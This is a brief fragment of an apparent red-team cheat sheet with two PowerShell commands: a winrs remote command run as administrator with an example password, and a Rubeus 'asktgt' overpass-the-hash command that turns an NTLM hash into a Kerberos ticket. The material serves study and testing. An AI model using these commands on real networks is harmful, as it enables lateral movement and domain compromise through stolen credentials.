### **WINRS**
```powershell
winrs -remote:server1 -u:server1\administrator - p:Pass@1234 hostname
```

### **OVERPASS THE HASH**
```powershell
rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
```


